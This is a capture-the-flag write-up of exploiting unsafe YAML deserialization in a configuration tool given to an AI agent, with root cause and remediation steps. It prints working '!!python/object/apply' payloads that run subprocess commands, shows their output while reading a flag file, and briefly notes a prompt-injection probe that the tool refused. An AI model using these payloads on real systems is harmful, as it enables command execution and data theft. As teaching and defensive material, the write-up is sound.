# Expert L6 — The Shape Shifter

| | |
|---|---|
| **Class** | Unsafe deserialization of untrusted configuration data |
| **CWE** | CWE-502 |
| **OWASP LLM** | LLM03:2025 (supply-chain / data integrity); not LLM01 |
| **Severity** | High (qualitative — no CVSS; privilege inputs not established) |
| **Flag** | `flag-XXXXXX` (redacted) |

## The target

A configuration processor exposed to an agent as a chat tool. It accepts YAML and returns an extracted/summarised settings object.

The question worth asking is not "can I prompt-inject it" but "what does the parser construct while it is being helpful".

## The path

1. **Baseline.** Anchors, aliases and flow-style mappings processed normally; native scalar types (`NO` → text, `0o17` → 15) typed correctly. A functional YAML parser.
2. **Prompt-injection probe.** An instruction-shaped string inside `notes:` was refused or echoed as data. Not a prompt-injection finding, and it was not pursued as one.
3. **Tag probe.** `probe: !!python/object/apply:os.getcwd []` was accepted with no output. Accepted is not the same as executed; noted, not claimed.
4. **Command execution.** The YAML-specific tag `!!python/object/apply` constructs a Python callable from the document:

```yaml
!!python/object/apply:subprocess.check_output [["id"]]
```

Response: `Value: b'uid=1002(mcpuser) gid=1002(mcpuser) groups=1002(mcpuser)\n'`

5. **Confirm the environment.** `pwd` → `b'/app/tmp/tmp0k59jv1h\n'`, with the response explicitly naming the unsafe tag. `ls -la` showed `flag.txt` present.
6. **Read the flag.** `cat flag.txt` → `b'flag-XXXXXX'`, followed by the level's completion state.

## Root cause

Unsafe YAML deserialization: untrusted configuration data is allowed to construct Python objects, and the loader resolves `!!python/object/*` tags into real callables. `subprocess.check_output` was invoked with an argv list, so this is **not** shell-metacharacter injection — it is deserialization, and the distinction changes the fix.

The exact loader line was never source-inspected; the payload evidence is the precise tag, and the observed behaviour is compatible with an unsafe PyYAML loader. The platform's own lessons panel names insecure deserialization and `yaml.load()` vs `yaml.safe_load()`.

## Impact

**Demonstrated:** OS command execution in the application process — identity, working directory, directory listing, file read. An attacker at the same privilege reads any file the account can and runs arbitrary commands.

**Not demonstrated:** root or host escape, persistence, other users' data, network exfiltration.

## Why it matters for agents

This is the least "AI" bug in the set and the most common in agent platforms. Configuration tools — YAML, pickle, templates, expression languages — are handed to models precisely because models are good at generating structured text. That makes "the user can write the document" a normal condition rather than an edge case.

## Remediation

1. `yaml.safe_load()` or equivalent; disable Python constructors and callable tags entirely.
2. Explicitly reject `!!python/object*` tags on untrusted input, before parsing.
3. Validate the parsed result against a strict schema — a complement to safe loading, not a replacement.
4. Least privilege: isolated process, read-only mounts, resource limits, restricted egress.
5. Regression test: a malicious `!!python/object/apply` document must be rejected without invoking anything.
